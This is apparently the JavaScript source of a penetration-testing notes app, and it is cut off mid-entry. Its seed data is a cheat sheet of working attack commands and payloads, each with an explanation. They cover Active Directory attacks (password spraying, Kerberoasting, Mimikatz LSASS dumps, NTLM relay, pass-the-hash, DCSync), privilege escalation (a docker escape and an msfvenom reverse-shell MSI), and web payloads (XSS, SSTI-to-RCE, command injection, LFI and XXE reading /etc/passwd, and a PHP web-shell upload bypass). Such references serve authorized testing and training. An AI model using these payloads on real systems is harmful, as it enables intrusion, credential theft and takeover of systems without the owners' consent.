'use strict';

/* =========================================================================
   CYBER NOTES SPA - script.js
   Vanilla JS, no dependencies. Handles:
   - View switching (Command Center / Methodology)
   - Theme switching
   - Command rendering, search, category filtering
   - Add/Edit ALL commands -> localStorage
   - Copy-to-clipboard
   - Methodology checklist with localStorage-persisted progress
   ========================================================================= */

/* ===================== 1. SEED COMMAND DATA ===================== */
/* Each command: { id, category, title, command, why, lookfor, tags, custom } */

const SEED_COMMANDS = [
  /* ------------------------- 01_RECON & WEB ENUM ------------------------- */
  {
    id: 'r1', category: 'recon',
    title: 'Rustscan -> full port sweep',
    command: 'rustscan -a $TARGET --ulimit 5000 -- -sV -sC -oN nmap-full.txt',
    why: 'Rustscan finds open ports fast, then hands them off to nmap for service/version detection and default scripts. Doing a full 65535-port sweep first avoids missing services on non-standard ports.',
    lookfor: 'Unexpected open ports (8080, 8443, 5985, 3389), service banners revealing exact versions, and any HTTP(S) service to pivot into web enum.',
    tags: ['nmap', 'rustscan', 'ports']
  },
  {
    id: 'r2', category: 'recon',
    title: 'Nmap targeted service/script scan',
    command: 'nmap -p$PORTS -sV -sC -A --script=vuln $TARGET -oA nmap-detailed',
    why: 'Once you know which ports are open, run a deeper scan with default+vuln NSE scripts against just those ports to save time while still getting version fingerprints and known-CVE hints.',
    lookfor: 'VULNERABLE flags from vuln scripts, outdated software banners, and OS fingerprint used for privesc research later.',
    tags: ['nmap', 'nse', 'vuln']
  },
  {
    id: 'r3', category: 'recon',
    title: 'Subdomain enumeration - subfinder + httpx',
    command: 'subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o live-subs.txt',
    why: 'subfinder passively pulls subdomains from many sources (crt.sh, VirusTotal, etc.) without touching the target directly; httpx then probes each host to confirm it is alive and grabs status code, title and tech detection in one pass.',
    lookfor: 'Staging/dev/admin subdomains, unusual status codes (401/403 worth bypassing), and outdated tech stacks in the title/tech-detect output.',
    tags: ['subfinder', 'httpx', 'subdomains']
  },
  {
    id: 'r4', category: 'recon',
    title: 'Amass passive + active enum',
    command: 'amass enum -passive -d target.com -o amass-passive.txt\namass enum -active -d target.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o amass-active.txt',
    why: 'Amass complements subfinder with additional data sources and active DNS brute forcing/permutation, which catches subdomains other tools miss.',
    lookfor: 'New hosts not found by subfinder, wildcard DNS responses (false positives) - verify these with httpx before trusting them.',
    tags: ['amass', 'dns', 'subdomains']
  },
  {
    id: 'r5', category: 'recon',
    title: 'FFUF directory brute force (raft-large)',
    command: "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,204,301,302,307,401,403 -fs 0 -t 50 -o ffuf-dirs.json -of json",
    why: 'raft-large-directories.txt is one of the most complete directory wordlists in SecLists. Filtering on common "interesting" status codes while excluding zero-length 200s (soft-404) cuts noise dramatically.',
    lookfor: '/admin, /api, /backup, /.git, /uploads and any 401/403 paths - these often hide functionality worth an auth bypass or forced-browse attempt.',
    tags: ['ffuf', 'fuzzing', 'directories']
  },
  {
    id: 'r6', category: 'recon',
    title: 'FFUF vhost / virtual host discovery',
    command: "ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs 4242",
    why: 'Many apps host multiple virtual hosts behind one IP. Fuzzing the Host header (rather than the URL path) reveals hidden vhosts that DNS enumeration alone would never find, since they may not even be in public DNS.',
    lookfor: 'A response size or status different from the baseline (-fs excludes the known "default vhost" response size) - that indicates a genuinely different vhost.',
    tags: ['ffuf', 'vhost', 'fuzzing']
  },
  {
    id: 'r7', category: 'recon',
    title: 'FFUF parameter discovery (GET)',
    command: "ffuf -u 'https://target.com/page.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 1234",
    why: 'Hidden GET/POST parameters frequently expose debug, admin, or IDOR-prone functionality (e.g. ?debug=1, ?admin=true, ?user_id=). This fuzzes common parameter names against a known baseline response size.',
    lookfor: 'Any response that differs in size/status from the baseline -fs value, reflected parameter values (possible XSS), or parameters that change app behavior.',
    tags: ['ffuf', 'parameters', 'fuzzing']
  },
  {
    id: 'r8', category: 'recon',
    title: 'Feroxbuster recursive content discovery',
    command: 'feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,json -d 3 -o ferox-out.txt',
    why: 'Feroxbuster recurses automatically into discovered directories up to a set depth and can brute common extensions in the same run, which is faster than manually re-running ffuf on every new folder found.',
    lookfor: 'Backup files (.bak, .old, ~), config files (.env, .json), and deeply nested admin panels that a single-level scan would miss.',
    tags: ['feroxbuster', 'fuzzing', 'directories']
  },
  {
    id: 'r9', category: 'recon',
    title: 'Gobuster DNS subdomain brute force',
    command: 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o gobuster-dns.txt',
    why: 'Active DNS brute forcing catches subdomains that never appear in certificate transparency logs or search engines because they are internal-only or never had a public TLS cert issued.',
    lookfor: 'Wildcard DNS (all queries resolve) - test with a random string first; internal-sounding names like vpn, jenkins, gitlab, dev, staging.',
    tags: ['gobuster', 'dns', 'subdomains']
  },
  {
    id: 'r10', category: 'recon',
    title: 'Katana - JS-aware crawling',
    command: 'katana -u https://target.com -jc -d 3 -kf all -o katana-urls.txt',
    why: 'Katana renders and follows links found inside JavaScript (via -jc, "js-crawl") which classic crawlers miss, surfacing API endpoints and routes only referenced client-side in SPAs.',
    lookfor: 'Endpoints under /api/, /v1/, /internal/, hardcoded tokens/keys in JS bundles, and comments left in source revealing internal logic.',
    tags: ['katana', 'crawling', 'js-recon']
  },
  {
    id: 'r11', category: 'recon',
    title: 'gau + LinkFinder for JS/URL harvesting',
    command: 'gau target.com --subs | grep -E "\\.js($|\\?)" | sort -u > js-files.txt\nwhile read url; do python3 linkfinder.py -i "$url" -o cli; done < js-files.txt',
    why: 'gau pulls historical URLs from Wayback Machine, Common Crawl and OTX (great for finding old/forgotten endpoints); piping discovered JS files through LinkFinder statically extracts endpoint paths embedded in the code.',
    lookfor: 'Old admin/debug endpoints still live, API paths not visible in the current UI, and leftover secrets/API keys in JS.',
    tags: ['gau', 'linkfinder', 'js-recon']
  },
  {
    id: 'r12', category: 'recon',
    title: 'Nuclei mass vulnerability scan',
    command: 'nuclei -l live-subs.txt -t cves/ -t exposures/ -t misconfiguration/ -severity medium,high,critical -o nuclei-results.txt',
    why: 'Nuclei runs thousands of community-maintained YAML templates for known CVEs, exposed panels and misconfigurations across all live hosts in one pass - a fast way to triage low-hanging fruit before manual testing.',
    lookfor: 'Any [critical]/[high] hit, exposed .git or .env files, default-credential panels, and known CVEs matching the fingerprinted tech stack.',
    tags: ['nuclei', 'scanning', 'cve']
  },
  {
    id: 'r13', category: 'recon',
    title: 'SMB enumeration - enum4linux-ng',
    command: 'enum4linux-ng -A $TARGET -oY enum4linux-out.yaml',
    why: 'Runs the full battery of SMB/NetBIOS/RPC enumeration checks (null sessions, shares, users, groups, password policy, OS info) in one command, aggregating what used to take many separate rpcclient/smbclient calls.',
    lookfor: 'Null session allowed, readable shares (especially SYSVOL/NETLOGON), password policy (lockout threshold for spraying), and a valid domain user/group list.',
    tags: ['smb', 'enum4linux', 'enumeration']
  },
  {
    id: 'r14', category: 'recon',
    title: 'FTP/SMB anonymous access check',
    command: 'smbclient -L //$TARGET -N\nftp $TARGET  # try anonymous / anonymous',
    why: 'Anonymous or guest access to FTP/SMB is still one of the most common quick wins - it directly hands over readable file shares without any credentials.',
    lookfor: 'Any share other than the default admin shares (C$, IPC$), readable/writable NETLOGON or SYSVOL, and files with credentials or configs.',
    tags: ['smb', 'ftp', 'anonymous']
  },
  {
    id: 'r15', category: 'recon',
    title: 'Nmap UDP top-ports scan',
    command: 'nmap -sU --top-ports 100 -sV $TARGET -oN nmap-udp.txt',
    why: 'UDP services (SNMP, DNS, NTP, TFTP) are frequently overlooked because a full UDP scan is slow; scanning just the top 100 UDP ports balances speed with coverage of the services attackers care about most.',
    lookfor: 'Open SNMP (161) with default community strings, TFTP (69) allowing file reads, and DNS (53) allowing zone transfers.',
    tags: ['nmap', 'udp', 'ports']
  },

  /* ------------------------- 02_ACTIVE DIRECTORY ------------------------- */
  {
    id: 'ad1', category: 'ad',
    title: 'NetExec (nxc) SMB user enumeration',
    command: 'nxc smb $DC_IP -u \'\' -p \'\' --users\nnxc smb $DC_IP -u guest -p \'\' --users',
    why: 'NetExec (successor to CrackMapExec) can enumerate the domain user list via SAMR over a null or guest SMB session, before you have any valid credentials at all.',
    lookfor: 'A full list of usernames (feed into AS-REP roasting / password spraying), and whether guest/null sessions are permitted at all - a config weakness worth reporting.',
    tags: ['nxc', 'crackmapexec', 'smb', 'enum']
  },
  {
    id: 'ad2', category: 'ad',
    title: 'NetExec password spraying',
    command: "nxc smb $DC_IP -u users.txt -p 'Summer2024!' --continue-on-success",
    why: 'Spraying one common password across many usernames (rather than many passwords against one user) avoids account lockout thresholds while still catching users with weak/seasonal passwords.',
    lookfor: '[+] marked successful logins in the output, and STATUS_LOGON_FAILURE vs STATUS_ACCOUNT_LOCKED_OUT (stop immediately if you see lockouts).',
    tags: ['nxc', 'password-spray', 'smb']
  },
  {
    id: 'ad3', category: 'ad',
    title: 'Kerbrute - AS-REP roast user enumeration',
    command: 'kerbrute userenum -d target.local --dc $DC_IP users.txt -o kerbrute-valid.txt',
    why: 'Kerbrute abuses the fact that Kerberos AS-REQ responses differ for valid vs invalid usernames (pre-auth required vs unknown principal), letting you enumerate valid domain accounts without triggering failed-logon lockout counters.',
    lookfor: '"VALID USERNAME" hits, and note which of those users might have Kerberos pre-authentication disabled (test next with GetNPUsers).',
    tags: ['kerbrute', 'kerberos', 'enum']
  },
  {
    id: 'ad4', category: 'ad',
    title: 'Impacket GetNPUsers - AS-REP Roasting',
    command: 'impacket-GetNPUsers target.local/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile asrep-hashes.txt',
    why: 'Any account with "Do not require Kerberos preauthentication" set can have its AS-REP response captured and cracked offline, with zero valid credentials needed to request it.',
    lookfor: 'Any returned $krb5asrep$ hash - crack offline with hashcat mode 18200; a hit means an immediately usable cleartext password.',
    tags: ['impacket', 'asreproast', 'kerberos']
  },
  {
    id: 'ad5', category: 'ad',
    title: 'Impacket GetUserSPNs - Kerberoasting',
    command: "impacket-GetUserSPNs target.local/user:'Password1' -dc-ip $DC_IP -request -outputfile kerberoast-hashes.txt",
    why: 'Any user account with a Service Principal Name (SPN) set can have its service ticket requested and the ticket is encrypted with the service account\'s NTLM hash - crackable offline without any further interaction with the DC.',
    lookfor: '$krb5tgs$ hashes for accounts, especially privileged service accounts (look for "Admin" or "SQL" in the name) - crack with hashcat mode 13100.',
    tags: ['impacket', 'kerberoast', 'kerberos']
  },
  {
    id: 'ad6', category: 'ad',
    title: 'BloodHound data collection - bloodhound-python',
    command: 'bloodhound-python -u user -p Password1 -d target.local -ns $DC_IP -c All --zip',
    why: 'BloodHound maps the entire AD trust/permission graph (group memberships, ACLs, sessions, trusts) so you can visually find the shortest attack path from your current foothold to Domain Admin.',
    lookfor: 'Kerberoastable users flagged, "shortest path to Domain Admins", and dangerous ACL edges like GenericAll/WriteDacl/ForceChangePassword on paths toward high-value targets.',
    tags: ['bloodhound', 'ad', 'graph']
  },
  {
    id: 'ad7', category: 'ad',
    title: 'LDAP anonymous/authenticated search',
    command: 'ldapsearch -x -H ldap://$DC_IP -b "DC=target,DC=local" -s sub "(objectClass=user)" sAMAccountName',
    why: 'Raw LDAP queries let you pull user/computer/group objects and their attributes directly, useful when GUI tools like BloodHound are blocked or you need a specific attribute (e.g. description fields that sometimes contain passwords).',
    lookfor: 'The "description" attribute on user objects (admins sometimes leave passwords there), userAccountControl flags indicating disabled pre-auth or "password never expires".',
    tags: ['ldap', 'ldapsearch', 'enum']
  },
  {
    id: 'ad8', category: 'ad',
    title: 'Certipy - AD CS enumeration & abuse (ESC1/ESC8)',
    command: "certipy find -u user@target.local -p 'Password1' -dc-ip $DC_IP -vulnerable -stdout",
    why: 'Misconfigured Active Directory Certificate Services templates (ESC1-ESC11) are a common privesc/persistence path; certipy flags exploitable templates automatically instead of manually auditing certsrv permissions.',
    lookfor: '"ESC1" / "ESC8" flags in the output, templates with enrollee-supplied-subject enabled, and low-privilege groups with enrollment rights on privileged templates.',
    tags: ['certipy', 'adcs', 'escalation']
  },
  {
    id: 'ad9', category: 'ad',
    title: 'Responder - LLMNR/NBT-NS poisoning',
    command: 'responder -I eth0 -wrf',
    why: 'Windows falls back to LLMNR/NBT-NS broadcast name resolution when DNS fails; Responder answers those broadcasts and captures NTLMv2 hashes from any host that tries to authenticate to the fake name it resolved.',
    lookfor: 'Captured NTLMv2-SSP hashes in Responder\'s log for various users - crack offline with hashcat mode 5600 or relay live with ntlmrelayx.',
    tags: ['responder', 'llmnr', 'ntlm']
  },
  {
    id: 'ad10', category: 'ad',
    title: 'Impacket ntlmrelayx - NTLM relay to SMB',
    command: 'ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"',
    why: 'Instead of cracking captured NTLM hashes offline, relay the live authentication attempt to another host with SMB signing disabled to get an interactive session as that user, no cracking required.',
    lookfor: 'SUCCESS lines showing a relayed session, and whether the relayed user has local admin on the target - that gives you a shell or secrets dump immediately.',
    tags: ['impacket', 'relay', 'ntlm']
  },
  {
    id: 'ad11', category: 'ad',
    title: 'Mimikatz - dump credentials from LSASS',
    command: 'privilege::debug\nsekurlsa::logonpasswords',
    why: 'Once you have local admin on a Windows box, Mimikatz reads LSASS process memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets of every logged-on user/service - a critical step for lateral movement.',
    lookfor: 'Plaintext passwords for domain accounts, NTLM hashes usable for pass-the-hash, and cached Kerberos TGTs for pass-the-ticket.',
    tags: ['mimikatz', 'lsass', 'credential-dump']
  },
  {
    id: 'ad12', category: 'ad',
    title: 'Pass-the-Hash with NetExec',
    command: "nxc smb $TARGET -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -x whoami",
    why: 'NTLM authentication accepts the hash itself instead of the plaintext password, so a captured/dumped NTLM hash can be used directly to authenticate and execute commands without ever cracking it.',
    lookfor: '(Pwn3d!) marker in nxc output confirming admin access, and command output from -x confirming code execution as that user.',
    tags: ['pth', 'nxc', 'ntlm']
  },
  {
    id: 'ad13', category: 'ad',
    title: 'PowerView - find users with local admin rights',
    command: 'Find-LocalAdminAccess\nGet-DomainGroupMember -Identity "Domain Admins" -Recurse',
    why: 'Mapping which machines a compromised user can admin locally, and recursively resolving nested group membership, quickly reveals lateral movement paths that BloodHound might not surface if collection was incomplete.',
    lookfor: 'Any machine returned by Find-LocalAdminAccess (means the current user can PSExec/WinRM into it), and unexpected accounts nested inside Domain Admins.',
    tags: ['powerview', 'lateral-movement', 'enum']
  },
  {
    id: 'ad14', category: 'ad',
    title: 'Evil-WinRM - interactive shell over WinRM',
    command: "evil-winrm -i $TARGET -u administrator -p 'Password1'",
    why: 'WinRM (port 5985/5986) is the standard remote-management protocol on modern Windows; evil-winrm gives a fully interactive PowerShell session with built-in upload/download and Bypass-4MSI helpers once you have valid creds.',
    lookfor: 'Successful shell as the target user, then check whoami /priv and whoami /groups immediately for privesc opportunities like SeImpersonatePrivilege.',
    tags: ['evil-winrm', 'winrm', 'shell']
  },
  {
    id: 'ad15', category: 'ad',
    title: 'noPac / sAMAccountName spoofing check',
    command: 'python3 noPac.py target.local/user:Password1 -dc-ip $DC_IP -dc-host DC01 --impersonate administrator -use-ldap',
    why: 'CVE-2021-42278/42287 lets a low-privileged user rename their machine account to impersonate a Domain Controller\'s computer account, then request a TGT as Administrator - a near-instant Domain Admin path when patches are missing.',
    lookfor: 'A successfully issued TGT for the Administrator account, and confirm the DC is unpatched (check patch level first with the --dc-list check mode).',
    tags: ['nopac', 'cve-2021-42278', 'escalation']
  },
  {
    id: 'ad16', category: 'ad',
    title: 'SMBMap - share enumeration with permissions',
    command: "smbmap -H $TARGET -u user -p 'Password1' -r",
    why: 'SMBMap lists every accessible share along with read/write permissions for the current user in one command, and can recurse to show directory contents - faster than manually connecting with smbclient to each share.',
    lookfor: 'Any share marked READ, WRITE - writable shares can sometimes be abused for code execution (e.g. dropping a payload where a scheduled task picks it up).',
    tags: ['smbmap', 'smb', 'shares']
  },
  {
    id: 'ad17', category: 'ad',
    title: 'GPP / cpassword decryption',
    command: 'gpp-decrypt <cpassword_from_Groups.xml>',
    why: 'Legacy Group Policy Preferences stored local-account passwords encrypted with a publicly known AES key (MS14-025); if SYSVOL still contains an old Groups.xml, the password can be decrypted instantly.',
    lookfor: 'Groups.xml, ScheduledTasks.xml, or Services.xml under SYSVOL containing a cpassword attribute.',
    tags: ['gpp', 'sysvol', 'cve-2014']
  },
  {
    id: 'ad18', category: 'ad',
    title: 'Impacket secretsdump - DCSync / SAM dump',
    command: "impacket-secretsdump target.local/user:'Password1'@$DC_IP",
    why: 'If the account has Replicating Directory Changes rights (often via a misconfigured ACL) this performs a DCSync, pulling every domain user\'s NTLM hash straight from the DC without ever touching LSASS - complete domain compromise.',
    lookfor: 'krbtgt hash (golden ticket material) and the Administrator NTLM hash in the output.',
    tags: ['secretsdump', 'dcsync', 'impacket']
  },

  /* ------------------------- 03_PRIVILEGE ESCALATION ------------------------- */
  {
    id: 'p1', category: 'privesc',
    title: 'LinPEAS - automated Linux enum',
    command: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a 2>&1 | tee linpeas-out.txt',
    why: 'LinPEAS automates dozens of manual privesc checks (SUID, cron, capabilities, kernel version, writable paths, credentials in files) and color-codes findings by likelihood of exploitability, saving huge amounts of manual enum time.',
    lookfor: 'Lines highlighted in red/yellow, especially GTFOBins-flagged SUID binaries, cron jobs running as root that are writable, and any exposed cleartext credentials.',
    tags: ['linpeas', 'linux', 'enum']
  },
  {
    id: 'p2', category: 'privesc',
    title: 'Find SUID/SGID binaries',
    command: "find / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null",
    why: 'A SUID binary runs with the file owner\'s privileges (often root) regardless of who executes it. Cross-referencing any unusual SUID binary against GTFOBins can reveal a direct way to spawn a root shell.',
    lookfor: 'Non-standard binaries with the SUID bit (anything not in the normal /usr/bin SUID baseline), and check each hit on gtfobins.github.io.',
    tags: ['suid', 'linux', 'gtfobins']
  },
  {
    id: 'p3', category: 'privesc',
    title: 'Enumerate Linux capabilities',
    command: 'getcap -r / 2>/dev/null',
    why: 'Linux capabilities grant specific root-like privileges (e.g. cap_setuid) to a binary without full SUID, and are often overlooked by admins because they are less well-known than SUID - making them a frequent unpatched escalation vector.',
    lookfor: 'cap_setuid+ep on any interpreter (python, perl) - lets you directly set your effective UID to 0.',
    tags: ['capabilities', 'linux', 'privesc']
  },
  {
    id: 'p4', category: 'privesc',
    title: 'Check writable cron jobs',
    command: "cat /etc/crontab /etc/cron.*/* 2>/dev/null\nls -la /etc/cron.d/\nfind / -writable -path '*cron*' 2>/dev/null",
    why: 'If a cron job runs as root and calls a script that your current user can write to, you can inject arbitrary commands that will execute with root privileges the next time the cron fires.',
    lookfor: 'Any script referenced by a root cron entry that is writable by your user or group, and wildcard usage in cron commands (wildcard injection).',
    tags: ['cron', 'linux', 'privesc']
  },
  {
    id: 'p5', category: 'privesc',
    title: 'Sudo -l - check allowed sudo commands',
    command: 'sudo -l',
    why: 'Misconfigured sudoers entries (NOPASSWD, allowing a binary that can spawn a shell or read/write arbitrary files) are one of the fastest and most common Linux privesc paths.',
    lookfor: 'Any command listed - cross-reference the exact binary/args against GTFOBins for a "sudo" escalation technique.',
    tags: ['sudo', 'linux', 'gtfobins']
  },
  {
    id: 'p6', category: 'privesc',
    title: 'Kernel exploit enumeration',
    command: 'uname -a\n./linux-exploit-suggester.sh',
    why: 'Older or unpatched kernels may be vulnerable to local privilege escalation CVEs (DirtyPipe, DirtyCow, OverlayFS); linux-exploit-suggester cross-references the kernel version against known exploit CVEs automatically.',
    lookfor: 'Any exploit marked "Highly probable" - verify the exact kernel version/patch level before attempting, and always have a stable shell/backup before running kernel exploits (they can crash the box).',
    tags: ['kernel', 'exploit-suggester', 'linux']
  },
  {
    id: 'p7', category: 'privesc',
    title: 'WinPEAS - automated Windows enum',
    command: '.\\winPEASx64.exe quiet servicesinfo applicationsinfo',
    why: 'WinPEAS automates checks for unquoted service paths, weak service/registry permissions, AlwaysInstallElevated, stored credentials, and scheduled tasks - the Windows equivalent of LinPEAS.',
    lookfor: 'Red/yellow highlighted findings, especially services with weak DACLs and AlwaysInstallElevated set to 1 in both HKLM and HKCU.',
    tags: ['winpeas', 'windows', 'enum']
  },
  {
    id: 'p8', category: 'privesc',
    title: 'Unquoted service path discovery',
    command: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
    why: 'A service binary path containing spaces but no surrounding quotes lets Windows interpret each space-separated segment as a possible executable path, so a writable folder earlier in that path lets you plant a malicious exe that runs as the service account (often SYSTEM).',
    lookfor: 'Paths like C:\\Program Files\\My App\\service.exe with no quotes, where you have write access to C:\\ or C:\\Program Files\\.',
    tags: ['unquoted-path', 'windows', 'services']
  },
  {
    id: 'p9', category: 'privesc',
    title: 'PrintSpoofer / GodPotato - SeImpersonatePrivilege abuse',
    command: '.\\PrintSpoofer64.exe -i -c cmd',
    why: 'Service accounts frequently retain SeImpersonatePrivilege; tools like PrintSpoofer/GodPotato abuse named-pipe impersonation (coercing the SYSTEM-run Print Spooler/RPCSS to connect back) to escalate straight to NT AUTHORITY\\SYSTEM.',
    lookfor: 'whoami /priv showing SeImpersonatePrivilege = Enabled beforehand; a SYSTEM shell after running the tool confirms success.',
    tags: ['printspoofer', 'potato', 'seimpersonate']
  },
  {
    id: 'p10', category: 'privesc',
    title: 'Scheduled task privesc enumeration',
    command: 'schtasks /query /fo LIST /v\nicacls "C:\\path\\to\\task-binary.exe"',
    why: 'A scheduled task that runs as SYSTEM/admin and points to a binary/script you can write to (weak ACL) gives guaranteed code execution at the next trigger with elevated privileges.',
    lookfor: 'Tasks running as SYSTEM/Administrator whose target file icacls output shows (F) or (W) for your current user or a group you belong to (e.g. Users, Everyone).',
    tags: ['scheduled-tasks', 'windows', 'acl']
  },
  {
    id: 'p11', category: 'privesc',
    title: 'AlwaysInstallElevated check & exploit',
    command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi',
    why: 'When both HKLM and HKCU AlwaysInstallElevated are set to 1, any user can install an MSI package with SYSTEM privileges - a guaranteed escalation if the flag is set.',
    lookfor: 'Both registry values returning 0x1 - if only one is set it does not apply.',
    tags: ['alwaysinstallelevated', 'windows', 'msi']
  },
  {
    id: 'p12', category: 'privesc',
    title: 'Linux docker group escape',
    command: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    why: 'Membership in the "docker" group is effectively root-equivalent: mounting the host filesystem into a container and chrooting into it grants full read/write access as root on the host.',
    lookfor: 'id output showing your user in the docker group, and confirm docker.sock is accessible before attempting this.',
    tags: ['docker', 'linux', 'group-abuse']
  },

  /* ------------------------- 04_WEBAPP / API ------------------------- */
  {
    id: 'w1', category: 'webapp',
    title: 'SQLmap - automated SQL injection testing',
    command: "sqlmap -u 'https://target.com/item?id=1' --batch --level=3 --risk=2 --dbs",
    why: 'sqlmap automates detection across all major injection techniques (boolean-blind, time-blind, error-based, UNION, stacked) and, once confirmed, can enumerate databases/tables/dump data far faster than manual payloads.',
    lookfor: 'Confirmed injectable parameter and technique, then enumerate --dbs, --tables, --dump on anything containing user/credential data.',
    tags: ['sqlmap', 'sqli', 'database']
  },
  {
    id: 'w2', category: 'webapp',
    title: 'Manual SQLi - UNION-based column discovery',
    command: "' ORDER BY 5-- -\n' UNION SELECT null,null,null,null,null-- -",
    why: 'Before dumping data you need to find the exact number of columns the original query returns; ORDER BY N incrementing until it errors tells you the column count, and UNION SELECT then confirms which columns are reflected in the output.',
    lookfor: 'An error at a specific ORDER BY number (that number minus 1 = column count), and which UNION SELECT position reflects back into the page content.',
    tags: ['sqli', 'union', 'manual']
  },
  {
    id: 'w3', category: 'webapp',
    title: 'XSS - basic reflected payload probing',
    command: "\"><script>alert(document.domain)</script>\n\"><img src=x onerror=alert(1)>",
    why: 'These canary payloads test whether user input is reflected without encoding/sanitization; the img/onerror variant is useful when <script> tags are filtered but event handlers are not.',
    lookfor: 'The payload executing (alert box) confirms unsanitized reflection; check the response source to see exactly how/where it was reflected (attribute, tag body, JS string context) to craft a working exploit.',
    tags: ['xss', 'reflected', 'payload']
  },
  {
    id: 'w4', category: 'webapp',
    title: 'SSTI - Jinja2/Twig detection payload',
    command: '{{7*7}}\n${7*7}\n#{7*7}\n<%= 7*7 %>',
    why: 'Trying each template engine\'s specific math-evaluation syntax against user input quickly fingerprints which templating engine is in use if the output "49" appears, confirming Server-Side Template Injection.',
    lookfor: 'A rendered "49" in the response (rather than the literal string) confirms SSTI - escalate toward RCE with engine-specific payloads (e.g. Jinja2: {{ cycler.__init__.__globals__.os.popen(\'id\').read() }}).',
    tags: ['ssti', 'jinja2', 'rce']
  },
  {
    id: 'w5', category: 'webapp',
    title: 'OS command injection probing',
    command: '; id\n| id\n`id`\n$(id)\n%0a id',
    why: 'Different shells/contexts require different injection separators (; for sequential, | for pipe, backticks/$() for subshell command substitution, %0a for newline injection in some parsers) - trying all catches more filtering configurations.',
    lookfor: 'Output of the id command appearing in the response (uid=... gid=...), confirming command injection into the underlying shell.',
    tags: ['command-injection', 'rce', 'payload']
  },
  {
    id: 'w6', category: 'webapp',
    title: 'LFI - path traversal & PHP wrapper',
    command: '../../../../etc/passwd\nphp://filter/convert.base64-encode/resource=index.php',
    why: 'Basic traversal confirms LFI by reading a known file; the php://filter wrapper then lets you read source code of PHP files as base64 (bypassing execution) to hunt for further vulnerabilities or hardcoded secrets in the app logic.',
    lookfor: 'Contents of /etc/passwd confirming traversal depth needed, and base64-encoded PHP source revealing DB credentials, include paths, or further LFI-to-RCE chains (log poisoning).',
    tags: ['lfi', 'path-traversal', 'php']
  },
  {
    id: 'w7', category: 'webapp',
    title: 'JWT - alg:none & weak secret attack',
    command: 'echo -n "SECRET" | hashcat -m 16500 jwt.txt -a 0 /usr/share/wordlists/rockyou.txt\n# Also try changing header alg to "none" and stripping the signature',
    why: 'Many JWT libraries historically trusted the alg field from the token itself; setting it to "none" and removing the signature can bypass verification entirely, and weak HMAC secrets are crackable offline with hashcat mode 16500.',
    lookfor: 'The server accepting a modified alg:none token as valid, or hashcat recovering the HS256 secret - either lets you forge arbitrary claims (e.g. role:admin).',
    tags: ['jwt', 'alg-none', 'hashcat']
  },
  {
    id: 'w8', category: 'webapp',
    title: 'IDOR - sequential ID enumeration with ffuf',
    command: "ffuf -u 'https://target.com/api/user/FUZZ/profile' -w <(seq 1 1000) -H 'Authorization: Bearer $LOW_PRIV_TOKEN' -mc 200 -fc 403",
    why: 'IDOR/BOLA vulnerabilities happen when object-level authorization is missing; iterating sequential or predictable IDs while authenticated as a low-privilege user reveals whether you can access other users\' resources.',
    lookfor: 'Any 200 response returning data belonging to a different user ID than the one your token/session owns.',
    tags: ['idor', 'bola', 'ffuf']
  },
  {
    id: 'w9', category: 'webapp',
    title: 'SSRF - basic internal probing payloads',
    command: 'http://127.0.0.1:80\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]:80',
    why: 'If a server-side feature fetches a user-supplied URL (webhooks, PDF generators, image proxies), redirecting it to loopback or the cloud metadata endpoint can expose internal-only services or, on cloud instances, leak IAM credentials.',
    lookfor: 'Any response body containing internal service data, or for cloud targets, IAM role names/temporary credentials from the metadata endpoint.',
    tags: ['ssrf', 'metadata', 'cloud']
  },
  {
    id: 'w10', category: 'webapp',
    title: 'XXE - basic out-of-band payload',
    command: '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>',
    why: 'If the app parses attacker-controlled XML with external entity resolution enabled, a DOCTYPE-defined entity referencing a local file will be substituted into the output, effectively giving arbitrary local file read.',
    lookfor: 'File contents reflected in the parsed response/output field; if not reflected try out-of-band (OOB) exfiltration via an external DTD hosted on your listener.',
    tags: ['xxe', 'xml', 'lfi']
  },
  {
    id: 'w11', category: 'webapp',
    title: 'File upload bypass - extension & magic bytes',
    command: 'shell.php.jpg\nshell.pHp\nshell.php%00.jpg\n# Prepend GIF89a; to fake the magic bytes: printf "GIF89a;\\n<?php system($_GET[\'c\']);?>" > shell.gif.php',
    why: 'Blocklist-based upload filters are frequently bypassed with case variation, double extensions, null-byte tricks (older stacks), or by satisfying a magic-byte/content-type check while keeping a server-executable extension.',
    lookfor: 'The uploaded file being stored with its original (executable) extension, and whether the upload directory itself allows script execution (test by requesting the uploaded path directly).',
    tags: ['file-upload', 'rce', 'bypass']
  },
  {
    id: 'w12', category: 'webapp',
    title: 'Nuclei targeted web app scan',
    command: 'nuclei -u https://target.com -t http/ -severity medium,high,critical -o nuclei-web.txt',
    why: 'Running the full HTTP template set (misconfigs, CVEs, exposed panels, default creds, takeovers) against a single confirmed target catches known issues fast before investing time in manual testing.',
    lookfor: 'Any critical/high finding, especially exposed .git/.env, default admin panels, and subdomain takeover indicators.',
